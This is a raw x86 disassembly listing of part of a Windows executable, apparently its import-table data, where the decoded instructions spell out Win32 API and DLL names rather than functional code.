  428652:	add    al,BYTE PTR [eax]
  428654:	pop    esp
  428655:	mov    al,BYTE PTR [edx]
  428657:	add    BYTE PTR [esi-0x76],ah
  42865a:	add    al,BYTE PTR [eax]
  42865c:	jo     0x4285e8
  42865e:	add    al,BYTE PTR [eax]
  428660:	or     BYTE PTR [edx-0x756ffffe],0x2
  428667:	add    BYTE PTR [edx-0x4dfffd76],ah
  42866d:	mov    al,BYTE PTR [edx]
  42866f:	add    al,al
  428671:	mov    al,BYTE PTR [edx]
  428673:	add    ah,cl
  428675:	mov    al,BYTE PTR [edx]
  428677:	add    dl,bl
  428679:	mov    al,BYTE PTR [edx]
  42867b:	add    dl,ch
  42867d:	mov    al,BYTE PTR [edx]
  42867f:	add    dl,bh
  428681:	mov    al,BYTE PTR [edx]
  428683:	add    BYTE PTR [eax],cl
  428685:	mov    eax,DWORD PTR [edx]
  428687:	add    BYTE PTR [eax],ah
  428689:	mov    eax,DWORD PTR [edx]
  42868b:	add    BYTE PTR [edx],ch
  42868d:	mov    eax,DWORD PTR [edx]
  42868f:	add    BYTE PTR [edx],bh
  428691:	mov    eax,DWORD PTR [edx]
  428693:	add    BYTE PTR [edx-0x75],dl
  428696:	add    al,BYTE PTR [eax]
  428698:	mov    eax,DWORD PTR fs:[edx]
  42869b:	add    BYTE PTR [ebx+ecx*4+0x2],dh
  42869f:	add    BYTE PTR [ebx+ecx*4-0x7471fffe],al
  4286a6:	add    al,BYTE PTR [eax]
  4286a8:	pushf  
  4286a9:	mov    eax,DWORD PTR [edx]
  4286ab:	add    BYTE PTR [ebx+ecx*4-0x7447fffe],ch
  4286b2:	add    al,BYTE PTR [eax]
	...
  4286bc:	loop   0x428649
  4286be:	add    al,BYTE PTR [eax]
  4286c0:	lock mov eax,DWORD PTR [edx]
  4286c3:	add    BYTE PTR [esp+ecx*4],al
  4286c6:	add    al,BYTE PTR [eax]
  4286c8:	adc    cl,BYTE PTR [edx+eax*1+0x28c2800]
  4286cf:	add    BYTE PTR [edx],dh
  4286d1:	mov    WORD PTR [edx],es
  4286d3:	add    BYTE PTR [esi],bh
  4286d5:	mov    WORD PTR [edx],es
  4286d7:	add    BYTE PTR [esi-0x74],cl
  4286da:	add    al,BYTE PTR [eax]
  4286dc:	pusha  
  4286dd:	mov    WORD PTR [edx],es
  4286df:	add    BYTE PTR [esi-0x74],bh
  4286e2:	add    al,BYTE PTR [eax]
  4286e4:	nop
  4286e5:	mov    WORD PTR [edx],es
  4286e7:	add    BYTE PTR [esi-0x53fffd74],bl
  4286ed:	mov    WORD PTR [edx],es
  4286ef:	add    al,al
  4286f1:	mov    WORD PTR [edx],es
  4286f3:	add    ah,dl
  4286f5:	mov    WORD PTR [edx],es
  4286f7:	add    ah,ah
  4286f9:	mov    WORD PTR [edx],es
  4286fb:	add    dl,dh
  4286fd:	mov    WORD PTR [edx],es
  4286ff:	add    BYTE PTR [eax],al
  428701:	lea    eax,[edx]
  428703:	add    BYTE PTR [edx],dl
  428705:	lea    eax,[edx]
  428707:	add    BYTE PTR [ecx*4-0x72cbfffe],ah
  42870e:	add    al,BYTE PTR [eax]
  428710:	inc    esi
  428711:	lea    eax,[edx]
  428713:	add    BYTE PTR [edx-0x73],dl
  428716:	add    al,BYTE PTR [eax]
  428718:	lea    ax,[edx]
  42871b:	add    BYTE PTR [edx-0x73],bh
  42871e:	add    al,BYTE PTR [eax]
  428720:	mov    cl,BYTE PTR [ebp-0x7269fffe]
  428726:	add    al,BYTE PTR [eax]
  428728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428729:	lea    eax,[edx]
  42872b:	add    BYTE PTR [edx-0x3dfffd73],dh
  428731:	lea    eax,[edx]
  428733:	add    al,bl
  428735:	lea    eax,[edx]
  428737:	add    ah,ah
  428739:	lea    eax,[edx]
  42873b:	add    al,dh
  42873d:	lea    eax,[edx]
  42873f:	add    ah,bh
  428741:	lea    eax,[edx]
  428743:	add    BYTE PTR [edx],dl
  428745:	mov    es,WORD PTR [edx]
  428747:	add    BYTE PTR [esi+ecx*4],ah
  42874a:	add    al,BYTE PTR [eax]
  42874c:	xor    al,0x8e
  42874e:	add    al,BYTE PTR [eax]
  428750:	inc    edx
  428751:	mov    es,WORD PTR [edx]
  428753:	add    BYTE PTR [esi-0x72],dl
  428756:	add    al,BYTE PTR [eax]
  428758:	mov    es,WORD PTR fs:[edx]
  42875b:	add    BYTE PTR [eax-0x72],bh
  42875e:	add    al,BYTE PTR [eax]
  428760:	mov    cl,BYTE PTR [esi-0x7167fffe]
  428766:	add    al,BYTE PTR [eax]
  428768:	mov    ah,0x8e
  42876a:	add    al,BYTE PTR [eax]
  42876c:	(bad)  
  42876d:	mov    es,WORD PTR [edx]
  42876f:	add    dh,dl
  428771:	mov    es,WORD PTR [edx]
  428773:	add    al,dh
  428775:	mov    es,WORD PTR [edx]
  428777:	add    BYTE PTR [esi],al
  428779:	pop    DWORD PTR [edx]
  42877b:	add    BYTE PTR [edi+ecx*4],dl
  42877e:	add    al,BYTE PTR [eax]
  428780:	and    cl,BYTE PTR [edi-0x70c7fffe]
  428786:	add    al,BYTE PTR [eax]
  428788:	push   esp
  428789:	pop    DWORD PTR [edx]
  42878b:	add    BYTE PTR [edx-0x71],ah
  42878e:	add    al,BYTE PTR [eax]
  428790:	je     0x428721
  428792:	add    al,BYTE PTR [eax]
  428794:	mov    BYTE PTR [edi-0x7061fffe],cl
  42879a:	add    al,BYTE PTR [eax]
  42879c:	mov    ah,0x8f
  42879e:	add    al,BYTE PTR [eax]
  4287a0:	retf   0x28f
  4287a3:	add    al,bl
  4287a5:	pop    DWORD PTR [edx]
  4287a7:	add    ah,ch
  4287a9:	pop    DWORD PTR [edx]
  4287ab:	add    ah,bh
  4287ad:	pop    DWORD PTR [edx]
  4287af:	add    BYTE PTR [eax],cl
  4287b1:	nop
  4287b2:	add    al,BYTE PTR [eax]
  4287b4:	sbb    dl,BYTE PTR [eax-0x6fd5fffe]
  4287ba:	add    al,BYTE PTR [eax]
  4287bc:	cmp    al,0x90
  4287be:	add    al,BYTE PTR [eax]
  4287c0:	dec    edx
  4287c1:	nop
  4287c2:	add    al,BYTE PTR [eax]
  4287c4:	pop    esp
  4287c5:	nop
  4287c6:	add    al,BYTE PTR [eax]
  4287c8:	jb     0x42875a
  4287ca:	add    al,BYTE PTR [eax]
  4287cc:	mov    ss,WORD PTR [eax-0x6f5bfffe]
  4287d2:	add    al,BYTE PTR [eax]
  4287d4:	mov    dh,0x90
  4287d6:	add    al,BYTE PTR [eax]
  4287d8:	enter  0x290,0x0
  4287dc:	ficom  DWORD PTR [eax-0x6f11fffe]
  4287e2:	add    al,BYTE PTR [eax]
  4287e4:	cld    
  4287e5:	nop
  4287e6:	add    al,BYTE PTR [eax]
  4287e8:	or     al,0x91
  4287ea:	add    al,BYTE PTR [eax]
  4287ec:	sbb    BYTE PTR [ecx-0x6ed9fffe],dl
  4287f2:	add    al,BYTE PTR [eax]
  4287f4:	ds xchg ecx,eax
  4287f6:	add    al,BYTE PTR [eax]
  4287f8:	dec    esi
  4287f9:	xchg   ecx,eax
  4287fa:	add    al,BYTE PTR [eax]
  4287fc:	pop    esp
  4287fd:	xchg   ecx,eax
  4287fe:	add    al,BYTE PTR [eax]
  428800:	jo     0x428793
  428802:	add    al,BYTE PTR [eax]
  428804:	jle    0x428797
  428806:	add    al,BYTE PTR [eax]
  428808:	mov    dl,BYTE PTR [ecx-0x6e63fffe]
  42880e:	add    al,BYTE PTR [eax]
  428810:	scas   al,BYTE PTR es:[edi]
  428811:	xchg   ecx,eax
  428812:	add    al,BYTE PTR [eax]
  428814:	rcl    BYTE PTR [ecx-0x6e29fffe],0x2
  42881b:	add    dl,ah
  42881d:	xchg   ecx,eax
  42881e:	add    al,BYTE PTR [eax]
  428820:	lock xchg ecx,eax
  428822:	add    al,BYTE PTR [eax]
  428824:	cld    
  428825:	xchg   ecx,eax
  428826:	add    al,BYTE PTR [eax]
  428828:	or     dl,BYTE PTR [edx-0x6de1fffe]
  42882e:	add    al,BYTE PTR [eax]
  428830:	sub    dl,BYTE PTR [edx-0x6dc1fffe]
  428836:	add    al,BYTE PTR [eax]
  428838:	dec    edx
  428839:	xchg   edx,eax
  42883a:	add    al,BYTE PTR [eax]
  42883c:	pop    edx
  42883d:	xchg   edx,eax
  42883e:	add    al,BYTE PTR [eax]
  428840:	push   0x7e000292
  428845:	xchg   edx,eax
  428846:	add    al,BYTE PTR [eax]
  428848:	add    BYTE PTR [eax],al
  42884a:	add    BYTE PTR [eax],al
  42884c:	xchg   esi,eax
  42884d:	xchg   edx,eax
  42884e:	add    al,BYTE PTR [eax]
  428850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428851:	xchg   edx,eax
  428852:	add    al,BYTE PTR [eax]
  428854:	mov    dh,0x92
  428856:	add    al,BYTE PTR [eax]
  428858:	into   
  428859:	xchg   edx,eax
  42885a:	add    al,BYTE PTR [eax]
  42885c:	loopne 0x4287f0
  42885e:	add    al,BYTE PTR [eax]
  428860:	repnz xchg edx,eax
  428862:	add    al,BYTE PTR [eax]
  428864:	or     al,0x93
  428866:	add    al,BYTE PTR [eax]
  428868:	sbb    al,0x93
  42886a:	add    al,BYTE PTR [eax]
  42886c:	es xchg ebx,eax
  42886e:	add    al,BYTE PTR [eax]
  428870:	cmp    BYTE PTR [ebx-0x6cb7fffe],dl
  428876:	add    al,BYTE PTR [eax]
  428878:	pusha  
  428879:	xchg   ebx,eax
  42887a:	add    al,BYTE PTR [eax]
  42887c:	jo     0x428811
  42887e:	add    al,BYTE PTR [eax]
  428880:	adc    BYTE PTR [ebx-0x6c6dfffe],0x2
  428887:	add    BYTE PTR [ebx+edx*4-0x6c4ffffe],ah
  42888e:	add    al,BYTE PTR [eax]
  428890:	mov    esp,0xd2000293
  428895:	xchg   ebx,eax
  428896:	add    al,BYTE PTR [eax]
  428898:	out    0x93,al
  42889a:	add    al,BYTE PTR [eax]
  42889c:	cld    
  42889d:	xchg   ebx,eax
  42889e:	add    al,BYTE PTR [eax]
  4288a0:	adc    BYTE PTR [edx+eax*1+0x2942600],dl
  4288a7:	add    BYTE PTR [eax],bh
  4288a9:	xchg   esp,eax
  4288aa:	add    al,BYTE PTR [eax]
  4288ac:	inc    esp
  4288ad:	xchg   esp,eax
  4288ae:	add    al,BYTE PTR [eax]
  4288b0:	push   esp
  4288b1:	xchg   esp,eax
  4288b2:	add    al,BYTE PTR [eax]
  4288b4:	jb     0x42884a
  4288b6:	add    al,BYTE PTR [eax]
  4288b8:	mov    WORD PTR [edx+eax*1+0x2949a00],ss
  4288bf:	add    BYTE PTR [esi-0x39fffd6c],ch
  4288c5:	xchg   esp,eax
  4288c6:	add    al,BYTE PTR [eax]
  4288c8:	ficom  DWORD PTR [edx+eax*1+0x294ea00]
  4288cf:	add    BYTE PTR [eax],al
  4288d1:	xchg   ebp,eax
  4288d2:	add    al,BYTE PTR [eax]
  4288d4:	adc    dl,BYTE PTR [ebp-0x6adffffe]
  4288da:	add    al,BYTE PTR [eax]
  4288dc:	xor    dl,BYTE PTR [ebp-0x6abffffe]
  4288e2:	add    al,BYTE PTR [eax]
  4288e4:	push   eax
  4288e5:	xchg   ebp,eax
  4288e6:	add    al,BYTE PTR [eax]
  4288e8:	xchg   bp,ax
  4288ea:	add    al,BYTE PTR [eax]
  4288ec:	jl     0x428883
  4288ee:	add    al,BYTE PTR [eax]
  4288f0:	mov    WORD PTR [ebp-0x6a5dfffe],ss
  4288f6:	add    al,BYTE PTR [eax]
  4288f8:	lods   al,BYTE PTR ds:[esi]
  4288f9:	xchg   ebp,eax
  4288fa:	add    al,BYTE PTR [eax]
  4288fc:	mov    esi,0xce000295
  428901:	xchg   ebp,eax
  428902:	add    al,BYTE PTR [eax]
  428904:	fcom   QWORD PTR [ebp-0x6a0dfffe]
  42890a:	add    al,BYTE PTR [eax]
  42890c:	add    BYTE PTR [eax],al
  42890e:	add    BYTE PTR [eax],al
  428910:	xchg   edx,eax
  428911:	add    edx,DWORD PTR [edx+0x74]
  428914:	ins    BYTE PTR es:[edi],dx
  428915:	dec    ecx
  428916:	outs   dx,BYTE PTR ds:[esi]
  428917:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  42891f:	jb     0x42898a
  428921:	outs   dx,BYTE PTR ds:[esi]
  428922:	add    BYTE PTR [bp+0x74],ch
  428926:	fs ins BYTE PTR es:[edi],dx
  428928:	ins    BYTE PTR es:[edi],dx
  428929:	cs fs ins BYTE PTR es:[edi],dx
  42892c:	ins    BYTE PTR es:[edi],dx
  42892d:	add    BYTE PTR [ecx+0x74654701],dl
  428933:	push   esi
  428934:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  42893b:	dec    edi
  42893c:	jb     0x4289a5
  42893e:	inc    ebp
  42893f:	js     0x428941
  428941:	add    BYTE PTR [edx+0x74654701],cl
  428947:	push   esp
  428948:	gs js  0x4289bf
  42894b:	inc    ebp
  42894c:	js     0x4289c2
  42894e:	outs   dx,BYTE PTR gs:[esi]
  428950:	je     0x4289a2
  428952:	outs   dx,DWORD PTR ds:[esi]
  428953:	imul   ebp,DWORD PTR [esi+0x74],0x1fb0057
  42895a:	push   ebx
  42895b:	gs je  0x4289b2
  42895e:	gs js  0x4289d5
  428961:	inc    ecx
  428962:	ins    BYTE PTR es:[edi],dx
  428963:	imul   esp,DWORD PTR [edi+0x6e],0xd50000
  42896a:	inc    ebp
  42896b:	js     0x4289e1
  42896d:	push   esp
  42896e:	gs js  0x4289e5
  428971:	dec    edi
  428972:	jne    0x4289e8
  428974:	push   edi
  428975:	add    BYTE PTR [eax],dl
  428977:	add    dl,BYTE PTR [edx+esi*2+0x61]
  42897b:	outs   dx,BYTE PTR ds:[esi]
  42897c:	jae    0x4289ea
  42897e:	popa   
  42897f:	je     0x4289e6
  428981:	inc    ebx
  428982:	push   0x65737261
  428987:	je     0x4289d2
  428989:	outs   dx,BYTE PTR ds:[esi]
  42898a:	outs   dx,WORD PTR ds:[esi]
  42898c:	add    BYTE PTR [eax],al
  42898e:	pop    ss
  42898f:	add    dl,BYTE PTR [edi+0x69]
  428992:	fs outs dx,BYTE PTR gs:[esi]
  428995:	push   eax
  428996:	popa   
  428997:	je     0x428a01
  428999:	add    BYTE PTR [ebp+0x65724300],cl
  42899f:	popa   
  4289a0:	je     0x428a07
  4289a2:	inc    ebx
  4289a3:	outs   dx,DWORD PTR ds:[esi]
  4289a4:	ins    DWORD PTR es:[edi],dx
  4289a5:	jo     0x428a08
  4289a7:	je     0x428a12
  4289a9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x44]
  4289ad:	inc    ebx
  4289ae:	add    BYTE PTR [eax],al
  4289b0:	mov    bh,0x1
  4289b2:	push   eax
  4289b3:	outs   dx,DWORD PTR ds:[esi]
  4289b4:	ins    BYTE PTR es:[edi],dx
  4289b5:	jns    0x428a23
  4289b7:	imul   ebp,DWORD PTR [esi+0x65],0x1940000
  4289be:	inc    edi
  4289bf:	gs je  0x428a19
  4289c2:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4289c9:	addr16 inc ebp
  4289cb:	js     0x4289cd
  4289cd:	add    cl,ch
  4289cf:	add    DWORD PTR [ebx+0x65],edx
  4289d2:	je     0x428a20
  4289d4:	popa   
  4289d5:	jns    0x428a46
  4289d7:	jne    0x428a4d
  4289d9:	add    bl,dl
  4289db:	add    DWORD PTR [ebx+0x65],edx
  4289de:	je     0x428a21
  4289e0:	bound  ebp,QWORD PTR [edi+0x72]
  4289e3:	je     0x428a35
  4289e5:	jb     0x428a56
  4289e7:	arpl   WORD PTR [eax],ax
  4289e9:	add    BYTE PTR [edx],cl
  4289eb:	add    dl,BYTE PTR [ebx+0x74]
  4289ee:	jb     0x428a55
  4289f0:	je     0x428a55
  4289f2:	push   0x69424944
  4289f7:	je     0x428a6c
  4289f9:	add    BYTE PTR [ebx+0x1],al
  4289fc:	inc    edi
  4289fd:	gs je  0x428a44
  428a00:	dec    ecx
  428a01:	inc    edx
  428a02:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655301eb
  428a0a:	je     0x428a59
  428a0c:	popa   
  428a0d:	jo     0x428a5c
  428a0f:	outs   dx,DWORD PTR ds:[esi]
  428a10:	fs add BYTE PTR gs:[eax],al
  428a14:	daa    
  428a15:	add    DWORD PTR [edi+0x65],eax
  428a18:	je     0x428a5c
  428a1a:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  428a1e:	add    BYTE PTR gs:[ebx+0x66664f01],ah
  428a25:	jae    0x428a8c
  428a27:	je     0x428a7b
  428a29:	outs   dx,BYTE PTR ds:[si]
  428a2b:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  428a32:	jo     0x428aa7
  428a34:	gs add ah,cl
  428a37:	add    DWORD PTR [ebx+0x63],edx
  428a3a:	popa   
  428a3b:	ins    BYTE PTR es:[edi],dx
  428a3c:	gs push edi
  428a3e:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428a45:	je     0x428a8c
  428a47:	js     0x428a49
  428a49:	add    BYTE PTR [edx+0x1],bh
  428a4c:	inc    edi
  428a4d:	gs je  0x428aa3
  428a50:	je     0x428ac1
  428a52:	arpl   WORD PTR [ebx+0x4f],bp
  428a55:	bound  ebp,QWORD PTR [edx+0x65]
  428a58:	arpl   WORD PTR [eax+eax*1+0x0],si
  428a5c:	call   0x5465:0x6e694c01
  428a63:	outs   dx,DWORD PTR ds:[esi]
  428a64:	add    BYTE PTR [eax],al
  428a66:	mov    dh,0x1
  428a68:	push   eax
  428a69:	outs   dx,DWORD PTR ds:[esi]
  428a6a:	ins    BYTE PTR es:[edi],dx
  428a6b:	jns    0x428ad4
  428a6d:	outs   dx,DWORD PTR ds:[esi]
  428a6e:	outs   dx,BYTE PTR ds:[esi]
  428a6f:	add    BYTE PTR [esi+0x1],bh
  428a72:	inc    edi
  428a73:	gs je  0x428aca
  428a76:	gs js  0x428aed
  428a79:	inc    ecx
  428a7a:	ins    BYTE PTR es:[edi],dx
  428a7b:	imul   esp,DWORD PTR [edi+0x6e],0x18c0000
  428a82:	inc    edi
  428a83:	gs je  0x428ada
  428a86:	gs js  0x428afd
  428a89:	inc    esi
  428a8a:	popa   
  428a8b:	arpl   WORD PTR [ebp+0x57],sp
  428a8e:	add    BYTE PTR [eax],al
  428a90:	mov    ebx,0x61655201
  428a95:	ins    BYTE PTR es:[edi],dx
  428a96:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428a9d:	je     0x428b13
  428a9f:	add    BYTE PTR gs:[eax],al
  428aa2:	mov    DWORD PTR [ecx],0x69736552
  428aa8:	jp     0x428b0f
  428aaa:	push   eax
  428aab:	popa   
  428aac:	ins    BYTE PTR es:[edi],dx
  428aad:	gs je  0x428b24
  428ab0:	add    BYTE PTR gs:[ecx+0x6d6f4300],al
  428ab7:	bound  ebp,QWORD PTR [ecx+0x6e]
  428aba:	gs push edx
  428abc:	outs   dx,BYTE PTR ds:[si]
  428abe:	add    BYTE PTR [eax],al
  428ac0:	push   cs
  428ac1:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  428ac5:	je     0x428b16
  428ac7:	jne    0x428b3d
  428ac9:	inc    ecx
  428aca:	add    BYTE PTR [eax],al
  428acc:	test   DWORD PTR [ecx],0x52746553
  428ad2:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428ad7:	outs   dx,BYTE PTR ds:[esi]
  428ad8:	add    BYTE PTR [eax],al
  428ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428adb:	add    BYTE PTR [ebx+0x72],al
  428ade:	gs popa 
  428ae0:	je     0x428b47
  428ae2:	push   eax
  428ae3:	popa   
  428ae4:	ins    BYTE PTR es:[edi],dx
  428ae5:	gs je  0x428b5c
  428ae8:	add    BYTE PTR gs:[ecx+eax*1],ah
  428aec:	inc    edi
  428aed:	gs je  0x428b32
  428af0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428af8:	jae    0x428afa
  428afa:	mov    DWORD PTR [eax],0x6d756e45
  428b00:	inc    esi
  428b01:	outs   dx,DWORD PTR ds:[esi]
  428b02:	outs   dx,BYTE PTR ds:[esi]
  428b03:	je     0x428b78
  428b05:	push   edi
  428b06:	add    BYTE PTR [eax],al
  428b08:	lods   al,BYTE PTR ds:[esi]
  428b09:	add    BYTE PTR [ebx+0x72],al
  428b0c:	gs popa 
  428b0e:	je     0x428b75
  428b10:	push   edx
  428b11:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428b16:	outs   dx,BYTE PTR ds:[esi]
  428b17:	dec    ecx
  428b18:	outs   dx,BYTE PTR ds:[esi]
  428b19:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  428b21:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428b25:	gs inc esp
  428b27:	inc    esp
  428b28:	inc    ecx
  428b29:	add    ch,dl
  428b2b:	add    DWORD PTR [ebx+0x65],edx
  428b2e:	je     0x428b72
  428b30:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428b38:	jae    0x428b3a
  428b3a:	mov    BYTE PTR [eax],al
  428b3c:	inc    ebx
  428b3d:	jb     0x428ba4
  428b3f:	popa   
  428b40:	je     0x428ba7
  428b42:	inc    edx
  428b43:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428b4b:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428b52:	mov    es,WORD PTR [ecx]
  428b54:	inc    edi
  428b55:	gs je  0x428bac
  428b58:	gs js  0x428bcf
  428b5b:	dec    ebp
  428b5c:	gs je  0x428bd1
  428b5f:	imul   esp,DWORD PTR [ebx+0x73],0x1da0057
  428b66:	push   ebx
  428b67:	gs je  0x428bac
  428b6a:	jb     0x428be1
  428b6c:	jae    0x428bd6
  428b6e:	dec    edi
  428b6f:	jb     0x428bd8
  428b71:	inc    ebp
  428b72:	js     0x428b74
  428b74:	mov    esp,0x63655201
  428b79:	je     0x428bc4
  428b7b:	outs   dx,BYTE PTR ds:[esi]
  428b7c:	push   edx
  428b7d:	imul   ebp,DWORD PTR gs:[bx+0x6e],0xcd0000
  428b86:	inc    ebp
  428b87:	jae    0x428bec
  428b89:	popa   
  428b8a:	jo     0x428bf1
  428b8c:	add    BYTE PTR [eax],al
  428b8e:	scas   eax,DWORD PTR es:[edi]
  428b8f:	add    DWORD PTR [eax+0x6f],edx
  428b92:	ins    BYTE PTR es:[edi],dx
  428b93:	jns    0x428bd7
  428b95:	gs jp  0x428c01
  428b98:	gs jb  0x428b9b
  428b9b:	add    BYTE PTR [ebx+0x65724300],ch
  428ba1:	popa   
  428ba2:	je     0x428c09
  428ba4:	push   edx
  428ba5:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428baa:	outs   dx,BYTE PTR ds:[esi]
  428bab:	add    BYTE PTR [edi+0x65724300],cl
  428bb1:	popa   
  428bb2:	je     0x428c19
  428bb4:	inc    esp
  428bb5:	inc    ebx
  428bb6:	push   edi
  428bb7:	add    BYTE PTR ds:0x74654701,bh
  428bbd:	inc    ebx
  428bbe:	jne    0x428c32
  428bc0:	jb     0x428c27
  428bc2:	outs   dx,BYTE PTR ds:[esi]
  428bc3:	je     0x428c14
  428bc5:	bound  ebp,QWORD PTR [edx+0x65]
  428bc8:	arpl   WORD PTR [eax+eax*1+0x0],si
  428bcc:	inc    edi
  428bcd:	inc    esp
  428bce:	dec    ecx
  428bcf:	xor    esi,DWORD PTR [edx]
  428bd1:	cs fs ins BYTE PTR es:[edi],dx
  428bd4:	ins    BYTE PTR es:[edi],dx
  428bd5:	add    BYTE PTR [ebx+0x6f],ah
  428bd8:	outs   dx,BYTE PTR ds:[esi]
  428bd9:	jae    0x428c4a
  428bdb:	ins    BYTE PTR es:[edi],dx
  428bdc:	gs cs fs ins BYTE PTR es:[edi],dx
  428be0:	ins    BYTE PTR es:[edi],dx
  428be1:	add    BYTE PTR [ecx],bh
  428be3:	add    BYTE PTR [ebx+0x68],al
  428be6:	popa   
  428be7:	jb     0x428c3e
  428be9:	jo     0x428c5b
  428beb:	gs jb  0x428c45
  428bee:	add    BYTE PTR [eax],al
  428bf0:	dec    esi
  428bf1:	add    dl,BYTE PTR [ebx+0x65]
  428bf4:	je     0x428c43
  428bf6:	outs   dx,BYTE PTR gs:[esi]
  428bf8:	jne    0x428c43
  428bfa:	je     0x428c61
  428bfc:	ins    DWORD PTR es:[edi],dx
  428bfd:	dec    ecx
  428bfe:	outs   dx,BYTE PTR ds:[esi]
  428bff:	outs   dx,WORD PTR ds:[esi]
  428c01:	push   edi
  428c02:	add    BYTE PTR [eax],al
  428c04:	scas   al,BYTE PTR es:[edi]
  428c05:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428c09:	fs inc ebx
  428c0b:	jne    0x428c7f
  428c0d:	jae    0x428c7e
  428c0f:	jb     0x428c68
  428c11:	add    BYTE PTR [eax+0x0],bl
  428c14:	inc    ebx
  428c15:	jb     0x428c7c
  428c17:	popa   
  428c18:	je     0x428c7f
  428c1a:	inc    esp
  428c1b:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  428c22:	jb     0x428c85
  428c24:	ins    DWORD PTR es:[edi],dx
  428c25:	inc    ecx
  428c26:	add    BYTE PTR [eax],al
  428c28:	popf   
  428c29:	add    DWORD PTR [ecx+0x73],ecx
  428c2c:	dec    ebp
  428c2d:	outs   dx,BYTE PTR gs:[esi]
  428c2f:	jne    0x428c31
  428c31:	add    BYTE PTR [eax+0x1],ch
  428c34:	inc    edi
  428c35:	gs je  0x428c8f
  428c38:	imul   ebp,DWORD PTR [esi+0x64],0x6200776f
  428c3f:	add    DWORD PTR [edi+0x65],eax
  428c42:	je     0x428c98
  428c44:	outs   dx,DWORD PTR ds:[esi]
  428c45:	jo     0x428c9e
  428c47:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428c4e:	mov    ds:0x57734901,eax
  428c53:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  428c5a:	jae    0x428cc5
  428c5c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  428c60:	sub    eax,0x74654701
  428c65:	dec    ebp
  428c66:	outs   dx,BYTE PTR gs:[esi]
  428c68:	jne    0x428cad
  428c6a:	push   0x4d6b6365
  428c6f:	popa   
  428c70:	jb     0x428cdd
  428c72:	inc    esp
  428c73:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  428c7a:	outs   dx,BYTE PTR ds:[esi]
  428c7b:	jae    0x428c7d
  428c7d:	add    BYTE PTR [edx],bl
  428c7f:	add    BYTE PTR [ebx+0x61],al
  428c82:	ins    BYTE PTR es:[edi],dx
  428c83:	ins    BYTE PTR es:[edi],dx
  428c84:	push   edi
  428c85:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428c8c:	outs   dx,DWORD PTR ds:[esi]
  428c8d:	arpl   WORD PTR [ecx+0x0],ax
  428c90:	repz add BYTE PTR [edi+0x65],al
  428c94:	je     0x428cd9
  428c96:	popa   
  428c97:	jb     0x428cfe
  428c99:	je     0x428ceb
  428c9b:	outs   dx,DWORD PTR ds:[esi]
  428c9c:	jae    0x428c9e
  428c9e:	ret    0x7702
  428ca1:	jbe    0x428d16
  428ca3:	jo     0x428d17
  428ca5:	imul   ebp,DWORD PTR [esi+0x74],0x5766
  428cac:	test   al,0x1
  428cae:	dec    esp
  428caf:	outs   dx,DWORD PTR ds:[esi]
  428cb0:	popa   
  428cb1:	fs inc ecx
  428cb3:	arpl   WORD PTR [ebx+0x65],sp
  428cb6:	ins    BYTE PTR es:[edi],dx
  428cb7:	gs jb  0x428d1b
  428cba:	je     0x428d2b
  428cbc:	jb     0x428d31
  428cbe:	push   edi
  428cbf:	add    BYTE PTR [edi],cl
  428cc1:	add    BYTE PTR [edx+0x72],al
  428cc4:	imul   ebp,DWORD PTR [esi+0x67],0x646e6957
  428ccb:	outs   dx,DWORD PTR ds:[esi]
  428ccc:	ja     0x428d22
  428cce:	outs   dx,DWORD PTR ds:[esi]
  428ccf:	push   esp
  428cd0:	outs   dx,DWORD PTR ds:[esi]
  428cd1:	jo     0x428cd3
  428cd3:	add    BYTE PTR [ecx+0x66654400],cl
  428cd9:	inc    esi
  428cda:	jb     0x428d3d
  428cdc:	ins    DWORD PTR es:[edi],dx
  428cdd:	gs push eax
  428cdf:	jb     0x428d50
  428ce1:	arpl   WORD PTR [ecx+0x0],ax
  428ce4:	mov    ebx,0x61724400
  428ce9:	ja     0x428d3f
  428ceb:	gs js  0x428d62
  428cee:	inc    ebp
  428cef:	js     0x428d48
  428cf1:	add    BYTE PTR [edx+0x666e4901],al
  428cf7:	ins    BYTE PTR es:[edi],dx
  428cf8:	popa   
  428cf9:	je     0x428d60
  428cfb:	push   edx
  428cfc:	arpl   WORD PTR gs:[eax+eax*1+0x5],si
  428d01:	add    dl,BYTE PTR [edx+0x65]
  428d04:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428d0c:	popa   
  428d0d:	jae    0x428d82
  428d0f:	push   edi
  428d10:	add    BYTE PTR [eax],al
  428d12:	inc    ebp
  428d13:	add    dl,BYTE PTR [ebx+0x65]
  428d16:	je     0x428d64
  428d18:	popa   
  428d19:	jae    0x428d8f
  428d1b:	inc    ebp
  428d1c:	jb     0x428d90
  428d1e:	outs   dx,DWORD PTR ds:[esi]
  428d1f:	jb     0x428d66
  428d21:	js     0x428d23
  428d23:	add    BYTE PTR [edx+0x43734901],dl
  428d29:	push   0x70557261
  428d2e:	jo     0x428d95
  428d30:	jb     0x428d73
  428d32:	add    BYTE PTR [eax],al
  428d34:	inc    ebx
